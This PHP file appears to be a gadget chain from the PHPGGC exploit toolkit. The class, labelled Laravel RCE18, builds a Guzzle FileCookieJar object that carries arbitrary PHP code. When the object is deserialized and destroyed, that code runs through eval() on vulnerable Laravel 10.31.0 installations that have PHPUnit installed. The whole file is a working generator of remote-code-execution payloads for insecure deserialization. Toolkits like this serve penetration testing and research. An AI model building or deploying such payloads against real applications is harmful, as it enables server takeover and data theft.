<?php

namespace GadgetChain\Laravel;

class RCE18 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '10.31.0';
    public static $vector = '__destruct';
    public static $author = 'ahmadshauqi';
    public static $information = '
        Executes given PHP code through eval().
        Requires PHPUnit, which is in the require-dev package. 
    ';

    public function generate(array $parameters)
    {
        $code = $parameters['code'] . "exit;";

        return new \GuzzleHttp\Cookie\FileCookieJar($code);
    }
}